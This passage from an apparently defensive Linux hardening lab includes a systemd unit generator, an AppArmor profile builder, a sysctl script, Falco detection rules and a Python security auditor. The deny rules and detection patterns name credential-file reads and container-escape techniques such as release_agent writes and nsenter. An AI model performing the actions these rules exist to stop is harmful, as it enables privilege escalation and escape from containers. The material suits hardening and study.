# === Capability Hardening ===
# Drop ALL capabilities, add only what's needed
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_BIND_SERVICE
# Lock out all other capabilities permanently
SecureBits=noroot noroot-locked no-setuid-fixup no-setuid-fixup-locked

# === Namespace Isolation ===
PrivateTmp=yes
PrivateDevices=yes
PrivateUsers=yes
ProtectHome=yes
ProtectSystem=strict
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectKernelLogs=yes
ProtectControlGroups=yes
ProtectHostname=yes
ProtectClock=yes
ProtectProc=invisible
ProcSubset=pid
RestrictNamespaces=yes
RestrictSUIDSGID=yes
RestrictRealtime=yes

# === Syscall Filtering ===
SystemCallFilter=@system-service
SystemCallFilter=~@debug @mount @raw-io @reboot @swap @obsolete @cpu-emulation @privileged
SystemCallArchitectures=native
SystemCallErrorNumber=EPERM

# === Memory Protection ===
MemoryDenyWriteExecute=yes
LockPersonality=yes
NoNewPrivileges=yes

# === Network ===
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
IPAddressDeny=any
IPAddressAllow=0.0.0.0/0

# === Resource Limits ===
MemoryMax=512M
MemoryHigh=400M
CPUQuota=100%
TasksMax=50
LimitNOFILE=1024
LimitNPROC=64

# === Filesystem ===
ReadWritePaths=/var/lib/$SERVICE_NAME /var/log/$SERVICE_NAME
ReadOnlyPaths=/etc/$SERVICE_NAME
TemporaryFileSystem=/tmp:size=50M
BindReadOnlyPaths=/dev/log

# === Logging ===
StandardOutput=journal
StandardError=journal
SyslogIdentifier=$SERVICE_NAME

[Install]
WantedBy=multi-user.target
EOF

echo ""
echo "[+] Generated: /tmp/${SERVICE_NAME}.service"
echo ""
echo "--- Security analysis (systemd-analyze) ---"
systemd-analyze security "/tmp/${SERVICE_NAME}.service" 2>/dev/null | \
    grep -E "EXPOSURE|Overall|✓|✗|→" | head -30

echo ""
echo "To deploy:"
echo "  sudo cp /tmp/${SERVICE_NAME}.service /etc/systemd/system/"
echo "  sudo systemctl daemon-reload"
echo "  sudo systemctl enable --now ${SERVICE_NAME}"
```

#### Step 10.2 — AppArmor Profile Generator

Create `aa_profile_gen.py`:

```python
#!/usr/bin/env python3
"""aa_profile_gen.py — Generate AppArmor profile from strace output."""
import subprocess
import sys
import os
import re
from collections import defaultdict

def trace_program(binary, args=None, duration=10):
    """Run program under strace and collect file access patterns."""
    cmd = ["strace", "-f", "-e", "trace=open,openat,read,write,connect,bind,socket",
           "-o", "/tmp/aa_trace.log", binary]
    if args:
        cmd.extend(args)

    print(f"[*] Tracing {binary} for {duration}s...")
    try:
        proc = subprocess.Popen(cmd)
        import time
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
    except Exception as e:
        print(f"[!] Trace error: {e}")
        return {}

    # Parse strace output
    accesses = defaultdict(set)
    try:
        with open("/tmp/aa_trace.log", 'r') as f:
            for line in f:
                # openat(AT_FDCWD, "/path/file", O_RDONLY) = 3
                match = re.search(r'open(?:at)?\([^,]*,\s*"([^"]+)",\s*([^)]+)\)', line)
                if match:
                    path = match.group(1)
                    flags = match.group(2)
                    if "O_RDONLY" in flags:
                        accesses[path].add('r')
                    if "O_WRONLY" in flags or "O_RDWR" in flags:
                        accesses[path].add('w')
                    if "O_CREAT" in flags:
                        accesses[path].add('w')

                # socket/connect/bind
                if "socket(" in line:
                    accesses["__network__"].add("inet")
                if "connect(" in line:
                    accesses["__network__"].add("connect")
                if "bind(" in line:
                    accesses["__network__"].add("bind")
    except FileNotFoundError:
        pass

    os.unlink("/tmp/aa_trace.log")
    return accesses

def generate_profile(binary, accesses):
    """Generate AppArmor profile from observed accesses."""
    profile_name = os.path.basename(binary)

    # Group paths by directory for wildcard rules
    dir_access = defaultdict(set)
    for path, perms in accesses.items():
        if path.startswith("__"):
            continue
        parent = os.path.dirname(path)
        dir_access[parent].update(perms)

    lines = [
        f'#include <tunables/global>',
        f'',
        f'{binary} {{',
        f'    #include <abstractions/base>',
        f'',
        f'    # File access rules (generated from strace)',
    ]

    # Sort paths for readability
    for path in sorted(accesses.keys()):
        if path.startswith("__"):
            continue
        perms = accesses[path]
        perm_str = ''.join(sorted(perms))
        lines.append(f'    {path} {perm_str},')

    # Network rules
    if "__network__" in accesses:
        lines.append('')
        lines.append('    # Network rules')
        if "inet" in accesses["__network__"]:
            lines.append('    network inet tcp,')
            lines.append('    network inet udp,')
            lines.append('    network inet6 tcp,')

    # Deny rules for sensitive paths
    lines.extend([
        '',
        '    # Security deny rules',
        '    deny /etc/shadow r,',
        '    deny /etc/gshadow r,',
        '    deny /root/** rwx,',
        '    deny /proc/*/ns/* rw,',
        '    deny /sys/fs/cgroup/**/release_agent w,',
        '',
        '    # Deny dangerous capabilities',
        '    deny capability sys_admin,',
        '    deny capability sys_ptrace,',
        '    deny capability sys_module,',
        '    deny capability mac_override,',
        '}',
    ])

    return '\n'.join(lines)

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary> [args...] [--duration N]")
        return

    binary = sys.argv[1]
    duration = 10
    args = []
    for i, arg in enumerate(sys.argv[2:], 2):
        if arg == "--duration" and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
        elif sys.argv[i - 1] != "--duration":
            args.append(arg)

    accesses = trace_program(binary, args, duration)

    if not accesses:
        print("[!] No file accesses captured. Try a longer duration.")
        return

    profile = generate_profile(binary, accesses)

    output_file = f"/tmp/apparmor_{os.path.basename(binary)}"
    with open(output_file, 'w') as f:
        f.write(profile)

    print(f"\n[+] Profile generated: {output_file}")
    print(f"    Observed {len(accesses)} unique paths")
    print(f"\nTo deploy:")
    print(f"    sudo cp {output_file} /etc/apparmor.d/{os.path.basename(binary)}")
    print(f"    sudo apparmor_parser -r /etc/apparmor.d/{os.path.basename(binary)}")
    print(f"\n--- Generated Profile ---")
    print(profile)

if __name__ == "__main__":
    main()
```

#### Step 10.3 — Comprehensive Sysctl Hardening

Create `sysctl_hardening.sh`:

```bash
#!/bin/bash
# sysctl_hardening.sh — Deploy and verify kernel security sysctls

echo "============================================"
echo "   Kernel Sysctl Security Hardening"
echo "============================================"

SYSCTL_FILE="/etc/sysctl.d/99-security-hardening.conf"

# Define settings with descriptions
declare -A SETTINGS
declare -A DESCRIPTIONS

SETTINGS[kernel.yama.ptrace_scope]=2
DESCRIPTIONS[kernel.yama.ptrace_scope]="Restrict ptrace to admin only"

SETTINGS[kernel.unprivileged_bpf_disabled]=1
DESCRIPTIONS[kernel.unprivileged_bpf_disabled]="Block unprivileged BPF programs"

SETTINGS[kernel.dmesg_restrict]=1
DESCRIPTIONS[kernel.dmesg_restrict]="Restrict dmesg to CAP_SYSLOG"

SETTINGS[kernel.kptr_restrict]=2
DESCRIPTIONS[kernel.kptr_restrict]="Hide kernel pointers in /proc"

SETTINGS[kernel.perf_event_paranoid]=3
DESCRIPTIONS[kernel.perf_event_paranoid]="Restrict perf_event to admin"

SETTINGS[fs.protected_symlinks]=1
DESCRIPTIONS[fs.protected_symlinks]="Protect against symlink attacks"

SETTINGS[fs.protected_hardlinks]=1
DESCRIPTIONS[fs.protected_hardlinks]="Protect against hardlink attacks"

SETTINGS[fs.protected_fifos]=2
DESCRIPTIONS[fs.protected_fifos]="Restrict FIFO creation in sticky dirs"

SETTINGS[fs.protected_regular]=2
DESCRIPTIONS[fs.protected_regular]="Restrict regular file creation in sticky dirs"

SETTINGS[net.core.bpf_jit_harden]=2
DESCRIPTIONS[net.core.bpf_jit_harden]="Harden BPF JIT against spraying"

SETTINGS[kernel.sysrq]=0
DESCRIPTIONS[kernel.sysrq]="Disable magic SysRq key"

SETTINGS[kernel.core_uses_pid]=1
DESCRIPTIONS[kernel.core_uses_pid]="Include PID in core dump filename"

SETTINGS[fs.suid_dumpable]=0
DESCRIPTIONS[fs.suid_dumpable]="Prevent core dumps from setuid programs"

# Check for user namespace setting
if [ -f /proc/sys/user/max_user_namespaces ]; then
    SETTINGS[user.max_user_namespaces]=0
    DESCRIPTIONS[user.max_user_namespaces]="Disable unprivileged user namespaces"
fi

# Show current vs desired state
echo ""
echo "--- Current vs Hardened Settings ---"
printf "  %-45s %-8s %-8s %s\n" "Setting" "Current" "Target" "Description"
printf "  %-45s %-8s %-8s %s\n" "-------" "-------" "------" "-----------"

CHANGES=0
for key in $(echo "${!SETTINGS[@]}" | tr ' ' '\n' | sort); do
    target="${SETTINGS[$key]}"
    current=$(sysctl -n "$key" 2>/dev/null || echo "N/A")
    desc="${DESCRIPTIONS[$key]}"

    if [ "$current" = "$target" ]; then
        status="✓"
    else
        status="→"
        CHANGES=$((CHANGES + 1))
    fi

    printf "  %-45s %-8s %-8s %s %s\n" "$key" "$current" "$target" "$status" "$desc"
done

echo ""
echo "  Settings needing change: $CHANGES"

if [ "$CHANGES" -eq 0 ]; then
    echo "  [+] All settings already at recommended values"
    exit 0
fi

# Apply changes
read -p "  Apply hardening settings? (y/N) " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "  Aborted."
    exit 0
fi

echo ""
echo "--- Applying settings ---"

# Generate sysctl config
{
    echo "# Security hardening — generated by sysctl_hardening.sh"
    echo "# $(date -u +'%Y-%m-%dT%H:%M:%SZ')"
    echo ""
    for key in $(echo "${!SETTINGS[@]}" | tr ' ' '\n' | sort); do
        echo "# ${DESCRIPTIONS[$key]}"
        echo "$key = ${SETTINGS[$key]}"
        echo ""
    done
} | sudo tee "$SYSCTL_FILE" > /dev/null

sudo sysctl -p "$SYSCTL_FILE" 2>&1 | sed 's/^/  /'

echo ""
echo "[+] Hardening applied. Settings persisted to: $SYSCTL_FILE"

# Verify
echo ""
echo "--- Verification ---"
FAILED=0
for key in $(echo "${!SETTINGS[@]}" | tr ' ' '\n' | sort); do
    target="${SETTINGS[$key]}"
    current=$(sysctl -n "$key" 2>/dev/null || echo "N/A")
    if [ "$current" != "$target" ]; then
        echo "  [!] $key = $current (expected $target)"
        FAILED=$((FAILED + 1))
    fi
done

if [ "$FAILED" -eq 0 ]; then
    echo "  [+] All settings verified"
else
    echo "  [!] $FAILED settings did not apply (may need reboot or kernel support)"
fi
```

---

### Exercise 11: Falco and Tetragon Detection Rules

**Objective:** Deploy runtime detection for capability abuse, namespace escapes, and LSM manipulation using Falco and Cilium Tetragon.

#### Step 11.1 — Falco Rules for Caps/NS/LSM

Create `/etc/falco/rules.d/caps_ns_lsm.yaml`:

```yaml
# caps_ns_lsm.yaml — Falco rules for capability, namespace, and LSM monitoring

# --- Capability Abuse ---
- rule: Capability Modification via capset
  desc: Process modifying its capability sets
  condition: >
    syscall.type = capset and not (proc.name in (systemd, dockerd, containerd))
  output: >
    Capability modification detected
    (user=%user.name proc=%proc.name pid=%proc.pid capset args=%evt.arg.res)
  priority: HIGH
  tags: [capabilities, privilege_escalation]

- rule: Ambient Capability Raise
  desc: Process raising ambient capabilities via prctl
  condition: >
    syscall.type = prctl and evt.arg.option = 47 and evt.arg.arg2 = 1
  output: >
    Ambient capability raise
    (user=%user.name proc=%proc.name pid=%proc.pid cap=%evt.arg.arg3)
  priority: HIGH
  tags: [capabilities, privilege_escalation]

- rule: Dangerous File Capabilities Set
  desc: Setting file capabilities on a binary (setcap)
  condition: >
    spawned_process and proc.name = setcap
  output: >
    File capabilities being set
    (user=%user.name cmdline=%proc.cmdline)
  priority: HIGH
  tags: [capabilities, persistence]

# --- Container Escape ---
- rule: Container Escape via release_agent
  desc: Writing to cgroup release_agent from container
  condition: >
    container and open_write and fd.name endswith "release_agent"
  output: >
    Container escape via release_agent
    (user=%user.name container=%container.name file=%fd.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, cve-2022-0492]

- rule: Namespace Enter from Container
  desc: Container process entering host namespaces
  condition: >
    container and
    ((spawned_process and proc.name = nsenter) or
     (syscall.type = setns))
  output: >
    Namespace escape attempt from container
    (user=%user.name container=%container.name proc=%proc.cmdline)
  priority: CRITICAL
  tags: [container, escape, namespace]

- rule: Privileged Container Started
  desc: Container started with --privileged flag
  condition: >
    container and evt.type = container and container.privileged = true
  output: >
    Privileged container started
    (image=%container.image.repository name=%container.name)
  priority: HIGH
  tags: [container, misconfiguration]

- rule: Container Mounting Host Block Device
  desc: Container process mounting a host block device
  condition: >
    container and syscall.type = mount and
    (evt.arg.dev startswith "/dev/sd" or
     evt.arg.dev startswith "/dev/vd" or
     evt.arg.dev startswith "/dev/nvme")
  output: >
    Container mounting host device
    (container=%container.name device=%evt.arg.dev target=%evt.arg.dir)
  priority: CRITICAL
  tags: [container, escape, mount]

# --- LSM Manipulation ---
- rule: SELinux Mode Changed
  desc: SELinux enforcement mode changed
  condition: >
    spawned_process and proc.name = setenforce
  output: >
    SELinux mode change
    (user=%user.name cmdline=%proc.cmdline)
  priority: CRITICAL
  tags: [lsm, defense_evasion]

- rule: AppArmor Profile Loaded or Removed
  desc: AppArmor profile manipulation
  condition: >
    spawned_process and proc.name = apparmor_parser
  output: >
    AppArmor profile change
    (user=%user.name cmdline=%proc.cmdline)
  priority: HIGH
  tags: [lsm, defense_evasion]

# --- Kernel Module Loading ---
- rule: Kernel Module Load
  desc: Kernel module loaded
  condition: >
    syscall.type in (init_module, finit_module) and not
    proc.name in (modprobe, kmod, systemd-modules)
  output: >
    Kernel module loaded by unexpected process
    (user=%user.name proc=%proc.name pid=%proc.pid)
  priority: CRITICAL
  tags: [rootkit, persistence]

# --- User Namespace Creation ---
- rule: User Namespace Created by Non-Root
  desc: Unprivileged user creating user namespace
  condition: >
    syscall.type = unshare and
    evt.arg.flags contains CLONE_NEWUSER and
    user.uid != 0
  output: >
    User namespace creation by non-root
    (user=%user.name uid=%user.uid proc=%proc.name)
  priority: MEDIUM
  tags: [namespace, attack_surface]
```

---

## PART C: FRAMEWORK DEVELOPMENT

### LinuxSecAudit — Unified Security Auditor

Build a comprehensive Python framework that audits capabilities, namespaces, cgroups, LSM configurations, and kernel memory security features from a single tool.

#### Framework Structure

```
linuxsecaudit/
├── setup.py
├── linuxsecaudit/
│   ├── __init__.py
│   ├── cli.py           # Main CLI entry point
│   ├── caps_audit.py    # Capability auditing
│   ├── ns_audit.py      # Namespace auditing
│   ├── cgroup_audit.py  # Cgroup auditing
│   ├── lsm_audit.py     # LSM configuration auditing
│   ├── container_audit.py # Container security audit
│   ├── kernel_audit.py  # Kernel memory security audit
│   └── report.py        # Report generation
```

#### `setup.py`

```python
from setuptools import setup, find_packages

setup(
    name="linuxsecaudit",
    version="1.0.0",
    packages=find_packages(),
    entry_points={
        "console_scripts": [
            "linuxsecaudit=linuxsecaudit.cli:main",
        ],
    },
    python_requires=">=3.8",
    description="Linux Security Auditor — capabilities, namespaces, cgroups, LSMs",
)
```

#### `linuxsecaudit/cli.py`

```python
#!/usr/bin/env python3
"""LinuxSecAudit CLI — unified Linux security auditing."""
import argparse
import sys
import json
from datetime import datetime, timezone

from . import caps_audit, ns_audit, cgroup_audit, lsm_audit
from . import container_audit, kernel_audit, report


def main():
    parser = argparse.ArgumentParser(
        description="LinuxSecAudit — Audit capabilities, namespaces, cgroups, LSMs, containers"
    )
    sub = parser.add_subparsers(dest="command")

    sub.add_parser("caps", help="Audit process and file capabilities")
    sub.add_parser("namespaces", help="Audit namespace isolation")
    sub.add_parser("cgroups", help="Audit cgroup resource limits")
    sub.add_parser("lsm", help="Audit LSM configurations (SELinux/AppArmor/Landlock)")
    sub.add_parser("containers", help="Audit running containers")
    sub.add_parser("kernel", help="Audit kernel memory security features")
    sub.add_parser("full", help="Run all audits and generate report")
    sub.add_parser("harden", help="Generate hardening recommendations")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"LinuxSecAudit — {timestamp}")
    print("=" * 60)

    findings = []

    if args.command in ("caps", "full"):
        findings.extend(caps_audit.run())
    if args.command in ("namespaces", "full"):
        findings.extend(ns_audit.run())
    if args.command in ("cgroups", "full"):
        findings.extend(cgroup_audit.run())
    if args.command in ("lsm", "full"):
        findings.extend(lsm_audit.run())
    if args.command in ("containers", "full"):
        findings.extend(container_audit.run())
    if args.command in ("kernel", "full"):
        findings.extend(kernel_audit.run())
    if args.command == "harden":
        report.print_hardening(findings if findings else _run_all())
        return

    report.print_summary(findings)


def _run_all():
    findings = []
    findings.extend(caps_audit.run())
    findings.extend(ns_audit.run())
    findings.extend(cgroup_audit.run())
    findings.extend(lsm_audit.run())
    findings.extend(container_audit.run())
    findings.extend(kernel_audit.run())
    return findings


if __name__ == "__main__":
    main()
```

#### `linuxsecaudit/caps_audit.py`

```python
"""Capability auditing module."""
import os
import re
import subprocess

DANGEROUS_CAPS = {
    0: "CAP_CHOWN", 1: "CAP_DAC_OVERRIDE", 2: "CAP_DAC_READ_SEARCH",
    6: "CAP_SETGID", 7: "CAP_SETUID", 8: "CAP_SETPCAP",
    13: "CAP_NET_RAW", 16: "CAP_SYS_MODULE", 17: "CAP_SYS_RAWIO",
    19: "CAP_SYS_PTRACE", 21: "CAP_SYS_ADMIN", 32: "CAP_MAC_OVERRIDE",
    39: "CAP_BPF",
}

HIGH_RISK_CAPS = {16, 17, 19, 21, 32}  # module, rawio, ptrace, admin, mac_override


def decode_caps(hexval):
    val = int(hexval, 16)
    return {bit: name for bit, name in DANGEROUS_CAPS.items() if val & (1 << bit)}


def run():
    findings = []
    print("\n--- Capability Audit ---")

    # Scan processes
    for pid_dir in sorted(os.listdir("/proc")):
        if not pid_dir.isdigit():
            continue
        try:
            status = open(f"/proc/{pid_dir}/status").read()
            comm = re.search(r"^Name:\s+(.+)$", status, re.M)
            cap_eff = re.search(r"^CapEff:\s+(\S+)$", status, re.M)
            cap_amb = re.search(r"^CapAmb:\s+(\S+)$", status, re.M)
            if not cap_eff:
                continue

            name = comm.group(1).strip() if comm else "?"
            eff_caps = decode_caps(cap_eff.group(1))
            amb_caps = decode_caps(cap_amb.group(1)) if cap_amb and int(cap_amb.group(1), 16) else {}

            if eff_caps:
                high_risk = {b: n for b, n in eff_caps.items() if b in HIGH_RISK_CAPS}
                if high_risk:
                    severity = "CRITICAL" if 21 in high_risk or 16 in high_risk else "HIGH"
                    finding = {
                        "category": "capabilities",
                        "severity": severity,
                        "pid": pid_dir,
                        "process": name,
                        "caps": list(high_risk.values()),
                        "message": f"PID {pid_dir} ({name}): {', '.join(high_risk.values())}",
                    }
                    findings.append(finding)
                    print(f"  [{severity}] {finding['message']}")

            if amb_caps:
                finding = {
                    "category": "capabilities",
                    "severity": "HIGH",
                    "pid": pid_dir,
                    "process": name,
                    "message": f"PID {pid_dir} ({name}): ambient caps = {', '.join(amb_caps.values())}",
                }
                findings.append(finding)
                print(f"  [HIGH] {finding['message']}")

        except (PermissionError, FileNotFoundError, ProcessLookupError):
            continue

    # Scan file capabilities
    print("\n  File capabilities:")
    for search_path in ("/usr", "/bin", "/sbin", "/opt"):
        if not os.path.isdir(search_path):
            continue
        try:
            result = subprocess.run(
                ["getcap", "-r", search_path],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.strip().splitlines():
                if any(name.lower().replace("cap_", "") in line.lower()
                       for name in DANGEROUS_CAPS.values()):
                    findings.append({
                        "category": "file_capabilities",
                        "severity": "MEDIUM",
                        "message": f"File cap: {line.strip()}",
                    })
                    print(f"    [MEDIUM] {line.strip()}")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            continue

    if not findings:
        print("  [OK] No dangerous capability configurations found")

    return findings
```

#### `linuxsecaudit/ns_audit.py`

```python
"""Namespace isolation auditing."""
import os


def run():
    findings = []
    print("\n--- Namespace Audit ---")

    # Compare with PID 1
    ns_types = ["cgroup", "ipc", "mnt", "net", "pid", "user", "uts"]
    shared = []

    for ns in ns_types:
        try:
            self_ns = os.readlink(f"/proc/self/ns/{ns}")
            host_ns = os.readlink(f"/proc/1/ns/{ns}")
            if self_ns == host_ns:
                shared.append(ns)
        except (OSError, FileNotFoundError):
            pass

    if shared:
        for ns in shared:
            severity = "HIGH" if ns in ("pid", "net", "user") else "MEDIUM"
            finding = {
                "category": "namespaces",
                "severity": severity,
                "message": f"Namespace '{ns}' shared with host PID 1",
            }
            findings.append(finding)
            print(f"  [{severity}] {finding['message']}")
    else:
        print("  [OK] All namespaces isolated from host")

    # Check user namespace sysctl
    try:
        max_userns = int(open("/proc/sys/user/max_user_namespaces").read().strip())
        if max_userns > 100:
            findings.append({
                "category": "namespaces",
                "severity": "MEDIUM",
                "message": f"user.max_user_namespaces = {max_userns} (high — increased kernel attack surface)",
            })
            print(f"  [MEDIUM] max_user_namespaces = {max_userns}")
    except (FileNotFoundError, ValueError):
        pass

    # Check mount propagation
    try:
        with open("/proc/self/mountinfo") as f:
            shared_mounts = sum(1 for line in f if "shared:" in line)
        if shared_mounts > 0:
            findings.append({
                "category": "namespaces",
                "severity": "MEDIUM",
                "message": f"{shared_mounts} mounts with shared propagation",
            })
            print(f"  [MEDIUM] {shared_mounts} shared mount propagation points")
    except (FileNotFoundError, PermissionError):
        pass

    return findings
```

#### `linuxsecaudit/lsm_audit.py`

```python
"""LSM configuration auditing."""
import os
import subprocess


def run():
    findings = []
    print("\n--- LSM Audit ---")

    # Active LSMs
    try:
        lsms = open("/sys/kernel/security/lsm").read().strip()
        print(f"  Active LSMs: {lsms}")

        if "selinux" not in lsms and "apparmor" not in lsms:
            findings.append({
                "category": "lsm",
                "severity": "HIGH",
                "message": "No major LSM (SELinux/AppArmor) active",
            })
            print("  [HIGH] No major LSM active")

        if "landlock" not in lsms:
            findings.append({
                "category": "lsm",
                "severity": "LOW",
                "message": "Landlock not in active LSM list",
            })

        if "yama" not in lsms:
            findings.append({
                "category": "lsm",
                "severity": "MEDIUM",
                "message": "Yama LSM not active (ptrace restrictions unavailable)",
            })
            print("  [MEDIUM] Yama not active")

        if "lockdown" not in lsms:
            findings.append({
                "category": "lsm",
                "severity": "MEDIUM",
                "message": "Lockdown LSM not active",
            })

    except FileNotFoundError:
        findings.append({
            "category": "lsm",
            "severity": "CRITICAL",
            "message": "Cannot read LSM list — securityfs not mounted?",
        })

    # AppArmor status
    try:
        result = subprocess.run(["aa-status"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            output = result.stdout
            if "0 profiles are in enforce mode" in output:
                findings.append({
                    "category": "lsm",
                    "severity": "HIGH",
                    "message": "AppArmor: 0 profiles in enforce mode",
                })
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # SELinux mode
    try:
        result = subprocess.run(["getenforce"], capture_output=True, text=True, timeout=5)
        mode = result.stdout.strip()
        if mode == "Permissive":
            findings.append({
                "category": "lsm",
                "severity": "HIGH",
                "message": "SELinux in Permissive mode (logging only, NOT enforcing)",
            })
            print("  [HIGH] SELinux Permissive")
        elif mode == "Disabled":
            findings.append({
                "category": "lsm",
                "severity": "CRITICAL",
                "message": "SELinux Disabled",
            })
            print("  [CRITICAL] SELinux Disabled")
        elif mode == "Enforcing":
            print("  [OK] SELinux Enforcing")
    except FileNotFoundError:
        pass

    # Lockdown
    try:
        lockdown = open("/sys/kernel/security/lockdown").read().strip()
        if "[none]" in lockdown:
            findings.append({
                "category": "lsm",
                "severity": "MEDIUM",
                "message": "Kernel lockdown: none (kernel writable from userspace)",
            })
            print(f"  [MEDIUM] Lockdown: {lockdown}")
        else:
            print(f"  [OK] Lockdown: {lockdown}")
    except FileNotFoundError:
        pass

    return findings
```

#### `linuxsecaudit/kernel_audit.py`

```python
"""Kernel memory security auditing."""
import os
import subprocess


KERNEL_CHECKS = [
    ("CONFIG_STACKPROTECTOR_STRONG", "Stack protector (strong)", "HIGH"),
    ("CONFIG_VMAP_STACK", "Vmapped kernel stacks", "HIGH"),
    ("CONFIG_KFENCE", "KFENCE runtime error detection", "MEDIUM"),
    ("CONFIG_STRICT_KERNEL_RWX", "Kernel text read-only", "CRITICAL"),
    ("CONFIG_STRICT_MODULE_RWX", "Module text read-only", "HIGH"),
    ("CONFIG_MODULE_SIG_FORCE", "Forced module signing", "HIGH"),
    ("CONFIG_INIT_ON_ALLOC_DEFAULT_ON", "Zero-init allocations", "MEDIUM"),
    ("CONFIG_INIT_ON_FREE_DEFAULT_ON", "Zero-wipe on free", "MEDIUM"),
    ("CONFIG_RANDOMIZE_BASE", "KASLR", "HIGH"),
    ("CONFIG_PAGE_TABLE_ISOLATION", "KPTI", "HIGH"),
    ("CONFIG_RANDOMIZE_KSTACK_OFFSET", "Kstack offset randomization", "MEDIUM"),
    ("CONFIG_SECURITY_LOCKDOWN_LSM", "Lockdown LSM", "MEDIUM"),
]

SYSCTL_CHECKS = [
    ("kernel.yama.ptrace_scope", "2", "Ptrace restricted to admin", "HIGH"),
    ("kernel.unprivileged_bpf_disabled", "1", "Unprivileged BPF disabled", "HIGH"),
    ("kernel.dmesg_restrict", "1", "dmesg restricted", "MEDIUM"),
    ("kernel.kptr_restrict", "2", "Kernel pointers hidden", "MEDIUM"),
    ("kernel.perf_event_paranoid", "3", "perf restricted", "MEDIUM"),
    ("fs.protected_symlinks", "1", "Symlink protection", "HIGH"),
    ("fs.protected_hardlinks", "1", "Hardlink protection", "HIGH"),
    ("net.core.bpf_jit_harden", "2", "BPF JIT hardening", "MEDIUM"),
]


def check_kernel_config(option):
    for config_path in [f"/boot/config-{os.uname().release}", "/proc/config.gz"]:
        try:
            if config_path.endswith(".gz"):
                import gzip
                with gzip.open(config_path, 'rt') as f:
                    content = f.read()
            else:
                with open(config_path) as f:
                    content = f.read()
            for line in content.splitlines():
                if line.startswith(f"{option}="):
                    return line.split("=")[1]
            return None
        except (FileNotFoundError, ImportError):
            continue
    return None


def run():
    findings = []
    print("\n--- Kernel Memory Security Audit ---")

    # Kernel config checks
    print("  Kernel config:")
    for option, desc, severity in KERNEL_CHECKS:
        val = check_kernel_config(option)
        if val in ("y", "m"):
            print(f"    [OK] {desc}")
        else:
            findings.append({
                "category": "kernel",
                "severity": severity,
                "message": f"Kernel config {option} not enabled ({desc})",
            })
            print(f"    [{severity}] {desc} — NOT enabled")

    # Sysctl checks
    print("\n  Sysctl settings:")
    for key, expected, desc, severity in SYSCTL_CHECKS:
        try:
            val = open(f"/proc/sys/{key.replace('.', '/')}").read().strip()
            if val == expected:
                print(f"    [OK] {key} = {val}")
            else:
                findings.append({
                    "category": "kernel_sysctl",
                    "severity": severity,
                    "message": f"{key} = {val} (recommended: {expected}) — {desc}",
                })
                print(f"    [{severity}] {key} = {val} (want {expected})")
        except FileNotFoundError:
            pass

    # KSM check
    try:
        ksm_run = int(open("/sys/kernel/mm/ksm/run").read().strip())
        if ksm_run:
            sharing = open("/sys/kernel/mm/ksm/pages_sharing").read().strip()
            findings.append({
                "category": "kernel",
                "severity": "MEDIUM",
                "message": f"KSM enabled (pages sharing: {sharing}) — timing side channel risk",
            })
            print(f"\n  [MEDIUM] KSM enabled (sharing {sharing} pages)")
    except (FileNotFoundError, ValueError):
        pass

    # Swap encryption check
    try:
        result = subprocess.run(["swapon", "--show=NAME", "--noheadings"],
                                capture_output=True, text=True, timeout=5)
        for dev in result.stdout.strip().splitlines():
            dev = dev.strip()
            if dev and "dm-" not in dev and "crypt" not in dev and "zram" not in dev:
                findings.append({
                    "category": "kernel",
                    "severity": "HIGH",
                    "message": f"Unencrypted swap device: {dev}",
                })
                print(f"  [HIGH] Unencrypted swap: {dev}")
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return findings
```

#### `linuxsecaudit/cgroup_audit.py`

```python
"""Cgroup resource limit auditing."""
import os


def run():
    findings = []
    print("\n--- Cgroup Audit ---")

    # Determine cgroup version
    cgroup_v2 = os.path.exists("/sys/fs/cgroup/cgroup.controllers")
    print(f"  Cgroup version: {'v2' if cgroup_v2 else 'v1'}")

    if cgroup_v2:
        # Check if resource controllers are enabled
        try:
            controllers = open("/sys/fs/cgroup/cgroup.controllers").read().strip()
            subtree = open("/sys/fs/cgroup/cgroup.subtree_control").read().strip()
            print(f"  Available controllers: {controllers}")
            print(f"  Subtree control: {subtree}")

            if "memory" not in subtree:
                findings.append({
                    "category": "cgroups",
                    "severity": "MEDIUM",
                    "message": "Memory controller not enabled in root subtree_control",
                })
            if "pids" not in subtree:
                findings.append({
                    "category": "cgroups",
                    "severity": "MEDIUM",
                    "message": "PIDs controller not enabled (fork bomb risk)",
                })
        except FileNotFoundError:
            pass
    else:
        # v1: check for devices controller
        if not os.path.exists("/sys/fs/cgroup/devices"):
            findings.append({
                "category": "cgroups",
                "severity": "HIGH",
                "message": "Devices cgroup controller not mounted",
            })

    if not findings:
        print("  [OK] Cgroup controllers configured")

    return findings
```

#### `linuxsecaudit/container_audit.py`

```python
"""Container security auditing (Docker)."""
import json
import subprocess


def run():
    findings = []
    print("\n--- Container Audit ---")

    try:
        result = subprocess.run(["docker", "ps", "-q"],
                                capture_output=True, text=True, timeout=10)
        containers = result.stdout.strip().splitlines()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        print("  Docker not available or not running")
        return findings

    if not containers:
        print("  No running containers")
        return findings

    print(f"  Found {len(containers)} running container(s)")

    for cid in containers:
        try:
            result = subprocess.run(["docker", "inspect", cid],
                                    capture_output=True, text=True, timeout=10)
            info = json.loads(result.stdout)[0]
        except (json.JSONDecodeError, subprocess.TimeoutExpired, IndexError):
            continue

        name = info.get("Name", "").strip("/")
        hc = info.get("HostConfig", {})

        if hc.get("Privileged"):
            findings.append({
                "category": "container",
                "severity": "CRITICAL",
                "message": f"Container '{name}': PRIVILEGED mode",
            })
            print(f"  [CRITICAL] {name}: privileged")

        if hc.get("PidMode") == "host":
            findings.append({
                "category": "container",
                "severity": "CRITICAL",
                "message": f"Container '{name}': shares host PID namespace",
            })
